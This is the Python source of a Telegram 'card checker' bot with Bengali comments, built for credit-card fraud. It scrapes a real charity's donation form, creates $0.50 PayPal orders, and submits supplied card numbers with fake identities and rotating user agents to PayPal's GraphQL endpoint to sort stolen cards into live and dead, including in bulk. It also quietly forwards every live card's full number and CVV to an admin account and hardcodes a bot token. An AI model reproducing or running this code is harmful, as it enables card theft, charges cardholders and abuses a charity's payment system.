import re, json, random, time, requests, string, os, asyncio
from fake_useragent import UserAgent
from faker import Faker
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime
import threading

# ============ কনফিগারেশন ============
BOT_TOKEN = "8948469626:AAEXfCsjBH4_IhnTtIaEJ4LAbodXGq0qWx0"
ADMIN_ID = 1978055060

USERS_FILE = "users.json"
APPROVED_USERS_FILE = "approved_users.json"

fake = Faker()

# গ্লোবাল ভেরিয়েবল - ট্র্যাক করতে কোন ইউজারের ফাইল প্রসেসিং চলছে
processing_files = {}

# ============ ডাটাবেস ফাংশন ============
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def load_approved():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_approved(approved):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(approved, f)

# ============ BIN LOOKUP ফাংশন ============
def get_bin_info(card_number):
    bin_num = card_number[:6]
    try:
        url = f"https://binlist.io/lookup/{bin_num}/"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': bin_num,
                'brand': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'country_code': data.get('country', {}).get('alpha2', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '🌍'),
                'phone': data.get('bank', {}).get('phone', 'N/A')
            }
    except:
        pass
    
    return {
        'bin': bin_num,
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN', 
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'country_code': 'XX',
        'emoji': '🌍',
        'phone': 'N/A'
    }

# ============ কার্ড চেক ফাংশন ============
def check_card(card_num, card_mon, card_yer, card_cvc):
    try:
        ua = UserAgent()
        us = ua.random
        session = requests.Session()
        
        url = "https://www.brightercommunities.org/donate-form/"
        headers = {'User-Agent': us}
        resp = session.get(url, headers=headers, timeout=10)
        
        hash_match = re.search(r'name="give-form-hash" value="([^"]+)"', resp.text)
        form_match = re.search(r'name="give-form-id" value="([^"]+)"', resp.text)
        prefix_match = re.search(r'name="give-form-id-prefix" value="([^"]+)"', resp.text)
        
        if not hash_match or not form_match or not prefix_match:
            return "ERROR: Form data not found"
        
        hash_val = hash_match.group(1)
        form_id = form_match.group(1)
        prefix = prefix_match.group(1)
        
        order_url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
        payload = {
            'give-form-id-prefix': prefix,
            'give-form-id': form_id,
            'give-form-minimum': '0.50',
            'give-form-hash': hash_val,
            'give-amount': '0.50',
            'give_first': fake.first_name(),
            'give_last': fake.last_name(),
            'give_email': fake.email()
        }
        
        resp2 = session.post(order_url, data=payload, headers=headers, timeout=10)
        order_data = resp2.json()
        order_id = order_data.get("data", {}).get("id")
        
        if not order_id:
            return "ERROR: Order ID not created"
        
        graphql_url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
        
        first_digit = card_num[0]
        card_types = {'3': 'JCB', '4': 'VISA', '5': 'MASTERCARD', '6': 'DISCOVER'}
        card_type = card_types.get(first_digit, "UNKNOWN")
        
        query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
        """
        
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f'{card_mon}/{card_yer}',
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode()
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        }
        
        payload_graphql = {"query": query, "variables": variables, "operationName": None}
        headers_graphql = {'User-Agent': us, 'Content-Type': 'application/json'}
        
        resp3 = session.post(graphql_url, data=json.dumps(payload_graphql), headers=headers_graphql, timeout=15)
        response_text = resp3.text
        
        if "accessToken" in response_text or "cartId" in response_text:
            return "LIVE_CHARGED"
        elif "INVALID_SECURITY_CODE" in response_text:
            return "LIVE_CVV"
        elif "INSUFFICIENT_FUNDS" in response_text or "INVALID_BILLING_ADDRESS" in response_text:
            return "LIVE_INSUFFICIENT"
        elif "EXPIRED_CARD" in response_text:
            return "DIE_EXPIRED"
        elif "ISSUER_DECLINE" in response_text:
            return "DIE_DECLINE"
        elif "RISK_DISALLOWED" in response_text:
            return "DIE_RISK"
        else:
            return "DIE_UNKNOWN"
            
    except Exception as e:
        return f"ERROR: {str(e)}"

# ============ ফাইল প্রসেসিং ফাংশন ============
async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, user_id):
    global processing_files
    
    cards = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cards.append({
                            'num': parts[0].strip(),
                            'mon': parts[1].strip(),
                            'yer': parts[2].strip(),
                            'cvc': parts[3].strip()
                        })
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)}")
        processing_files[user_id] = False
        return None
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found in file!")
        processing_files[user_id] = False
        return None
    
    total = len(cards)
    live_cards = []
    start_time = time.time()
    
    # ইনিশিয়াল প্রোগ্রেস মেসেজ
    progress_text = f"""📁 FILE CHECK STARTED
━━━━━━━━━━━━━━━━
📊 Total Cards: {total}
⏳ Progress: 0/{total} (0%)
✅ Live Found: 0
⏱️ Elapsed: 0s
━━━━━━━━━━━━━━━━

🔄 Starting check..."""
    
    progress_msg = await update.message.reply_text(progress_text)
    
    for i, card in enumerate(cards, 1):
        # চেক করছি ইউজার চলে গেছে কিনা
        if not processing_files.get(user_id, True):
            await progress_msg.delete()
            await update.message.reply_text("⏹️ File check cancelled!")
            return None
        
        yer = card['yer']
        if len(yer) == 4:
            yer = yer[2:]
        
        # কার্ড চেক করা
        result = check_card(card['num'], card['mon'], yer, card['cvc'])
        
        elapsed = int(time.time() - start_time)
        percent = int((i / total) * 100)
        
        # লাইভ কার্ড পেলে সাথে সাথে দেখানো
        if result in ["LIVE_CHARGED", "LIVE_CVV", "LIVE_INSUFFICIENT"]:
            live_cards.append({
                'card': card,
                'result': result,
                'bin': get_bin_info(card['num'])
            })
            
            if result == "LIVE_CHARGED":
                live_status = "🔥 CHARGED"
                icon = "🔥"
            elif result == "LIVE_CVV":
                live_status = "⚡️ CVV LIVE"
                icon = "⚡️"
            else:
                live_status = "💰 INSUFFICIENT"
                icon = "💰"
            
            bin_info = get_bin_info(card['num'])
            
            live_msg = f"""✅ LIVE CARD FOUND! #{len(live_cards)} {icon}

💳 `{card['num']}|{card['mon']}|{yer}|{card['cvc']}`
📊 {live_status}
🏦 {bin_info['brand']} - {bin_info['country']}
📊 BIN: {bin_info['bin']}"""
            
            await update.message.reply_text(live_msg, parse_mode='Markdown')
        
        # প্রোগ্রেস আপডেট (প্রতি কার্ডে)
        avg_time = elapsed / i if i > 0 else 0
        remaining = int((total - i) * avg_time) if avg_time > 0 else 0
        
        progress_text = f"""📁 FILE CHECK IN PROGRESS
━━━━━━━━━━━━━━━━
📊 Total: {total}
⏳ Progress: {i}/{total} ({percent}%)
✅ Live: {len(live_cards)}
⏱️ Elapsed: {elapsed}s
🕐 ETA: {remaining}s
━━━━━━━━━━━━━━━━

🔄 Checking: `{card['num'][:4]}****{card['num'][-4:]}`
⚡ Speed: {avg_time:.1f}s/card"""
        
        try:
            await progress_msg.edit_text(progress_text, parse_mode='Markdown')
        except:
            pass
        
        # রেট লিমিট এড়ানোর জন্য সামান্য delay
        await asyncio.sleep(1.5)
    
    # ফাইনাল রিপোর্ট
    await progress_msg.delete()
    
    total_time = int(time.time() - start_time)
    
    # লাইভ কার্ডের লিস্ট তৈরি
    if live_cards:
        live_list = "✅ LIVE CARDS FOUND\n━━━━━━━━━━━━━━━━\n"
        for idx, lc in enumerate(live_cards, 1):
            if lc['result'] == "LIVE_CHARGED":
                icon = "🔥"
                status = "CHARGED"
            elif lc['result'] == "LIVE_CVV":
                icon = "⚡️"
                status = "CVV"
            else:
                icon = "💰"
                status = "INSF"
            live_list += f"{idx}. {icon} `{lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}` [{status}]\n"
    else:
        live_list = "❌ No live cards found!"
    
    final_report = f"""📁 FILE CHECK COMPLETE
━━━━━━━━━━━━━━━━
📊 STATISTICS:
• Total Cards: {total}
• Live Cards: {len(live_cards)}
• Dead Cards: {total - len(live_cards)}
• Success Rate: {(len(live_cards)/total*100):.1f}%

⏱️ TIME:
• Duration: {total_time} seconds
• Average: {total_time/total:.1f}s/card

{live_list}
━━━━━━━━━━━━━━━━"""
    
    if len(final_report) > 4000:
        parts = [final_report[i:i+4000] for i in range(0, len(final_report), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode='Markdown')
    else:
        await update.message.reply_text(final_report, parse_mode='Markdown')
    
    # অ্যাডমিন রিপোর্ট
    admin_report = f"""📁 FILE CHECK REPORT

👤 User: {update.effective_user.first_name}
🆔 ID: {update.effective_user.id}
📊 Total: {total}
✅ Live: {len(live_cards)}
💀 Dead: {total - len(live_cards)}
⏱️ Time: {total_time}s

📋 Live Cards:
"""
    for lc in live_cards:
        admin_report += f"\n{lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}"
    
    if len(admin_report) > 4000:
        admin_report = admin_report[:4000]
    
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_report)
    
    processing_files[user_id] = False
    return live_cards

# ============ টেলিগ্রাম হ্যান্ডলার ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    # ইউজার রেজিস্টার
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'name': user_name,
            'username': update.effective_user.username,
            'date': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        save_users(users)
        
        # অ্যাডমিনকে নোটিফিকেশন
        admin_text = f"""🆕 NEW USER REGISTERED!

👤 Name: {user_name}
🆔 ID: <code>{user_id}</code>
📛 Username: @{update.effective_user.username}
📅 Date: {users[str(user_id)]['date']}

🔓 Approve Command:
<code>/approve {user_id}</code>"""
        
        keyboard = [[InlineKeyboardButton("📋 COPY COMMAND", callback_data=f"copy_{user_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=reply_markup, parse_mode='HTML')
    
    # চেক ইউজার অ্যাপ্রুভড কিনা
    approved_users = load_approved()
    
    welcome_text = f"""🔥 CARD CHECKER BOT v3.0

Welcome {user_name}!

━━━━━━━━━━━━━━━━
📌 STATUS: {'✅ APPROVED' if user_id in approved_users else '⏳ PENDING APPROVAL'}
━━━━━━━━━━━━━━━━

⚡️ FEATURES:
• Single Card Check
• Bulk File Check with Live Progress
• BIN Lookup with Country/Bank Info
• Copy Card Details
• Multi-User Support

💡 HOW TO USE:

1️⃣ SINGLE CHECK:
Send: `number|month|year|cvv`
Example: `4000000000000000|12|2026|123`

2️⃣ FILE CHECK:
Send a .txt file with one card per line:
`card|month|year|cvv`

3️⃣ BIN LOOKUP:
Send first 6 digits of card

━━━━━━━━━━━━━━━━
👑 Bot by @thispersonisbrand537
"""
    
    keyboard = []
    if user_id in approved_users:
        keyboard = [
            [InlineKeyboardButton("🔍 SINGLE CHECK", callback_data='single_check')],
            [InlineKeyboardButton("📁 FILE CHECK", callback_data='file_check')],
            [InlineKeyboardButton("ℹ️ BIN LOOKUP", callback_data='bin_lookup')],
            [InlineKeyboardButton("📊 MY INFO", callback_data='my_info')]
        ]
    else:
        keyboard = [[InlineKeyboardButton("⏳ WAITING APPROVAL", callback_data='waiting')]]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# অ্যাপ্রুভ কমান্ড (শুধু অ্যাডমিন)
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id not in approved_users:
            approved_users.append(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} has been approved!")
            
            # ইউজারকে নোটিফিকেশন
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="✅ CONGRATULATIONS! You have been approved!\n\nYou can now use the bot.\nSend /start to continue."
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User {user_id} is already approved!")
    except:
        await update.message.reply_text("❌ Usage: /approve <user_id>\nExample: /approve 123456789")

# রিমুভ কমান্ড (শুধু অ্যাডমিন)
async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    try:
        user_id = int(context.args[0])
        approved_users = load_approved()
        
        if user_id in approved_users:
            approved_users.remove(user_id)
            save_approved(approved_users)
            
            await update.message.reply_text(f"✅ User {user_id} has been removed!")
            
            # ইউজারকে নোটিফিকেশন
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text="⚠️ Your access has been revoked by admin!"
                )
            except:
                pass
        else:
            await update.message.reply_text(f"⚠️ User {user_id} not found!")
    except:
        await update.message.reply_text("❌ Usage: /remove <user_id>\nExample: /remove 123456789")

# ইউজার লিস্ট কমান্ড (শুধু অ্যাডমিন)
async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    users = load_users()
    approved = load_approved()
    
    text = "📊 USERS LIST\n━━━━━━━━━━━━━━━━\n\n"
    
    pending_text = "⏳ PENDING USERS:\n"
    approved_text = "\n✅ APPROVED USERS:\n"
    
    pending_count = 0
    approved_count = 0
    
    for uid, info in users.items():
        uid_int = int(uid)
        if uid_int in approved:
            approved_text += f"• {info['name']} - `{uid}`\n"
            approved_count += 1
        else:
            pending_text += f"• {info['name']} - `{uid}`\n"
            pending_count += 1
    
    text += f"{pending_text}\nTotal: {pending_count}\n"
    text += f"\n{approved_text}\nTotal: {approved_count}\n"
    text += f"\n━━━━━━━━━━━━━━━━\n📊 Total Users: {len(users)}"
    
    await update.message.reply_text(text, parse_mode='Markdown')

# সিঙ্গেল চেক বাটন
async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await query.message.reply_text("❌ You are not approved yet!\nWait for admin approval.")
        return
    
    await query.message.reply_text(
        "🔍 SINGLE CARD CHECK\n━━━━━━━━━━━━━━━━\n\n"
        "Send card in this format:\n"
        "`number|month|year|cvv`\n\n"
        "Example:\n"
        "`4000000000000000|12|2026|123`\n\n"
        "Type or paste your card:",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_card'] = True

# ফাইল চেক বাটন
async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await query.message.reply_text("❌ You are not approved yet!\nWait for admin approval.")
        return
    
    await query.message.reply_text(
        "📁 FILE CHECK\n━━━━━━━━━━━━━━━━\n\n"
        "Send a .txt file containing cards.\n\n"
        "Format (one per line):\n"
        "`card|month|year|cvv`\n\n"
        "Example file content:\n"
        "`4000000000000000|12|2026|123`\n"
        "`4111111111111111|01|2027|456`\n\n"
        "⚠️ Progress will be shown live!",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_file'] = True

# বিআইএন লুকআপ বাটন
async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await query.message.reply_text("❌ You are not approved yet!\nWait for admin approval.")
        return
    
    await query.message.reply_text(
        "🔍 BIN LOOKUP\n━━━━━━━━━━━━━━━━\n\n"
        "Send first 6 digits of the card:\n"
        "Example: `400000`\n\n"
        "I will show:\n"
        "• Card Brand (Visa/Mastercard)\n"
        "• Card Type (Credit/Debit)\n"
        "• Issuing Bank\n"
        "• Country",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_bin'] = True

# মাই ইনফো বাটন
async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    approved_users = load_approved()
    
    text = f"""📊 MY INFORMATION
━━━━━━━━━━━━━━━━

👤 Name: {user.first_name}
🆔 ID: `{user.id}`
📛 Username: @{user.username}
⭐️ Premium: {'Yes' if user.is_premium else 'No'}
✅ Status: {'Approved' if user.id in approved_users else 'Pending'}

📅 Joined: {load_users().get(str(user.id), {}).get('date', 'Unknown')}
━━━━━━━━━━━━━━━━"""
    
    await query.message.reply_text(text, parse_mode='Markdown')

# ওয়েটিং বাটন
async def waiting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "⏳ ACCOUNT PENDING APPROVAL\n━━━━━━━━━━━━━━━━\n\n"
        "Your account is waiting for admin approval.\n\n"
        "Please be patient. You will receive a notification once approved.\n\n"
        "Thank you for your patience!"
    )

# কার্ড মেসেজ হ্যান্ডলার
async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_card'):
        return
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_card'] = False
        return
    
    card_text = update.message.text.strip()
    parts = card_text.split('|')
    
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ INVALID FORMAT!\n━━━━━━━━━━━━━━━━\n\n"
            "Please use this format:\n"
            "`number|month|year|cvv`\n\n"
            "Example:\n"
            "`4000000000000000|12|2026|123`",
            parse_mode='Markdown'
        )
        return
    
    card_num = parts[0].strip()
    card_mon = parts[1].strip()
    card_yer = parts[2].strip()
    card_cvc = parts[3].strip()
    
    # Year format fix
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    # BIN তথ্য নেওয়া
    bin_info = get_bin_info(card_num)
    
    # স্ট্যাটাস মেসেজ
    status_msg = await update.message.reply_text("⏳ CHECKING CARD...\n\nPlease wait...")
    start_time = time.time()
    
    # কার্ড চেক করা
    result = check_card(card_num, card_mon, card_yer, card_cvc)
    
    elapsed = int(time.time() - start_time)
    await status_msg.delete()
    
    # রেজাল্ট ফরম্যাট
    if result == "LIVE_CHARGED":
        status = "✅ LIVE CHARGED"
        status_emoji = "🔥"
        details = "• $0.50 Charged Successfully\n• Card is Active & Valid"
    elif result == "LIVE_CVV":
        status = "⚡️ CVV LIVE"
        status_emoji = "💳"
        details = "• CVV is Correct\n• Card is Valid"
    elif result == "LIVE_INSUFFICIENT":
        status = "💰 LIVE - INSUFFICIENT"
        status_emoji = "💵"
        details = "• Card Valid\n• Insufficient Balance"
    elif result.startswith("ERROR"):
        status = "⚠️ ERROR"
        status_emoji = "❌"
        details = f"• {result}"
    else:
        status = "❌ DIE"
        status_emoji = "💀"
        details = "• Card Invalid/Expired\n• Cannot be used"
    
    # রেজাল্ট টেক্সট
    result_text = f"""{status_emoji} CARD CHECK RESULT {status_emoji}
━━━━━━━━━━━━━━━━
{status}
━━━━━━━━━━━━━━━━

💳 CARD DETAILS:
• Number: `{card_num}`
• Month: {card_mon}
• Year: 20{card_yer}
• CVV: {card_cvc}

🏦 BIN INFORMATION:
• BIN: {bin_info['bin']}
• Brand: {bin_info['brand']}
• Type: {bin_info['type']}
• Level: {bin_info['level']}
• Bank: {bin_info['bank']}
• Country: {bin_info['emoji']} {bin_info['country']}
• Phone: {bin_info['phone']}

📊 STATUS INFO:
{details}

⏱️ TIME TAKEN: {elapsed} seconds
━━━━━━━━━━━━━━━━"""
    
    # কপি বাটন
    card_details = f"{card_num}|{card_mon}|{card_yer}|{card_cvc}"
    keyboard = [[InlineKeyboardButton("📋 COPY CARD", callback_data=f"copy_{card_details}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(result_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # অ্যাডমিন নোটিফিকেশন
    admin_msg = f"""🔔 CARD CHECKED

👤 User: {update.effective_user.first_name}
🆔 ID: {user_id}
💳 Card: {card_num}|{card_mon}|{card_yer}|{card_cvc}
📊 Result: {status}
🏦 BIN: {bin_info['bin']} - {bin_info['country']}
⏱️ Time: {elapsed}s"""
    
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    
    context.user_data['awaiting_card'] = False

# ফাইল ডকুমেন্ট হ্যান্ডলার
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_file'):
        return
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_file'] = False
        return
    
    # চেক করছে অন্য কোনো ফাইল প্রসেসিং চলছে কিনা এই ইউজারের
    if processing_files.get(user_id, False):
        await update.message.reply_text(
            "⚠️ FILE CHECK ALREADY RUNNING!\n━━━━━━━━━━━━━━━━\n\n"
            "You already have a file check in progress.\n"
            "Please wait for it to complete before starting another one."
        )
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ INVALID FILE TYPE!\n━━━━━━━━━━━━━━━━\n\n"
            "Please send a .txt file only.\n\n"
            "Format:\n"
            "`card|month|year|cvv`\n\n"
            "Example:\n"
            "`4000000000000000|12|2026|123`",
            parse_mode='Markdown'
        )
        return
    
    # ফাইল ডাউনলোড
    status_msg = await update.message.reply_text("📥 DOWNLOADING FILE...")
    file = await context.bot.get_file(document.file_id)
    file_path = f"temp_{user_id}_{int(time.time())}.txt"
    await file.download_to_drive(file_path)
    await status_msg.delete()
    
    # ফাইল প্রসেসিং শুরু
    processing_files[user_id] = True
    await process_file_cards(update, context, file_path, user_id)
    
    # ক্লিনআপ
    if os.path.exists(file_path):
        os.remove(file_path)
    
    context.user_data['awaiting_file'] = False

# বিআইএন হ্যান্ডলার
async def handle_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_bin'):
        return
    
    user_id = update.effective_user.id
    approved_users = load_approved()
    
    if user_id not in approved_users:
        await update.message.reply_text("❌ You are not approved!")
        context.user_data['awaiting_bin'] = False
        return
    
    bin_num = update.message.text.strip()[:6]
    
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text(
            "❌ INVALID BIN!\n━━━━━━━━━━━━━━━━\n\n"
            "Please send first 6 digits of the card.\n"
            "Example: `400000`",
            parse_mode='Markdown'
        )
        return
    
    bin_info = get_bin_info(bin_num)
    
    text = f"""🔍 BIN LOOKUP RESULT
━━━━━━━━━━━━━━━━

📊 BIN NUMBER: {bin_info['bin']}

💳 CARD INFORMATION:
• Brand: {bin_info['brand']}
• Type: {bin_info['type']}
• Level: {bin_info['level']}

🏦 BANK INFORMATION:
• Bank Name: {bin_info['bank']}
• Bank Phone: {bin_info['phone']}

🌍 COUNTRY INFORMATION:
• Country: {bin_info['emoji']} {bin_info['country']}
• Country Code: {bin_info['country_code']}
━━━━━━━━━━━━━━━━"""
    
    keyboard = [[InlineKeyboardButton("🔄 CHECK ANOTHER", callback_data='bin_lookup')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, reply_markup=reply_markup)
    context.user_data['awaiting_bin'] = False

# কপি হ্যান্ডলার
async def copy_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data.startswith("copy_"):
        card_details = data.replace("copy_", "")
        await query.answer(f"✅ Copied: {card_details}", show_alert=True)

# এরর হ্যান্ডলার
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Error: {context.error}")
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "⚠️ AN ERROR OCCURRED!\n━━━━━━━━━━━━━━━━\n\n"
                "Please try again later.\n"
                "If the problem persists, contact admin."
            )
    except:
        pass

# ============ মেইন ফাংশন ============
def main():
    # বট তৈরি
    application = Application.builder().token(BOT_TOKEN).build()
    
    # কমান্ড হ্যান্ডলার
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", users_list))
    
    # কলব্যাক হ্যান্ডলার
    application.add_handler(CallbackQueryHandler(single_check, pattern='single_check'))
    application.add_handler(CallbackQueryHandler(file_check, pattern='file_check'))
    application.add_handler(CallbackQueryHandler(bin_lookup, pattern='bin_lookup'))
    application.add_handler(CallbackQueryHandler(my_info, pattern='my_info'))
    application.add_handler(CallbackQueryHandler(waiting, pattern='waiting'))
    application.add_handler(CallbackQueryHandler(copy_card, pattern='^copy_'))
    
    # মেসেজ হ্যান্ডলার
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bin))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # এরর হ্যান্ডলার
    application.add_error_handler(error_handler)
    
    # বট চালু
    print("=" * 50)
    print("🤖 CARD CHECKER BOT STARTED!")
    print("=" * 50)
    print(f"✅ Admin ID: {ADMIN_ID}")
    print(f"✅ Bot Token: {BOT_TOKEN[:10]}...")
    print(f"✅ Multi-User Mode: ENABLED")
    print(f"✅ File Processing: READY")
    print("=" * 50)
    print("📱 Bot is running... Press Ctrl+C to stop")
    print("=" * 50)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
